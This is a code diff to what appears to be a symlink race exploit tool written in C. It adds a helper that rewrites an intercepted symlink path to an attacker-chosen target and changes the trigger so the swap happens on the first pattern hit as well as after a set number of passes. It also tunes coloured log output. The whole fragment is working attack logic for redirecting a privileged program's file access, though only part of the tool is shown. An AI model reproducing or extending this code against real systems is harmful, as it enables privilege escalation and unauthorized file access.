@@ -117,6 +117,17 @@ static bool is_duplicate(unsigned n)
     return false;
 }
 
+static void pivot_symlink(char *orig_dest, size_t size, const char *new_dest)
+{
+    if ( strlen(new_dest) + 1 > size ) {
+        dprintf(logfd, "Error: symlink destination too long");
+        return;
+    }
+
+    dprintf(logfd, "[*] \x1B[35mPivoting symlink\x1B[0m to \x1B[34m%s\x1B[0m\n", new_dest);
+    strcpy(orig_dest, new_dest);
+}
+
 static int is_symlink(char *buf, size_t size)
 {
     if ( size < pattern_size )
@@ -135,11 +146,13 @@ static int is_symlink(char *buf, size_t size)
                 }
 
                 symlink_hit(symlink_num);
-                dprintf(logfd, "\n[*] Detected pattern %s (hit: %d)\n", buf + i, symlink_hits[symlink_num-1]);
+                dprintf(logfd, "\n[*] Detected pattern \x1B[33m%s\x1B[0m (hit: %d)\n", buf + i, symlink_hits[symlink_num-1]);
 
-                if ( symlink_num == MAX_SYMLINKS && symlink_hits[symlink_num-1] >= nr_pass ) {
-                    dprintf(logfd, "[*] Pivoting symlink to %s\n", target);
-                    strcpy(buf + i, target);
+                if ( symlink_num == MAX_SYMLINKS && symlink_hits[symlink_num-1] == 1 ) {
+                    pivot_symlink(buf + i, size - i, target);
+                }
+                else if ( symlink_num == MAX_SYMLINKS && symlink_hits[symlink_num-1] >= nr_pass ) {
+                    pivot_symlink(buf + i, size - i, target);
                     enable_slowdown = false;
                 }
 
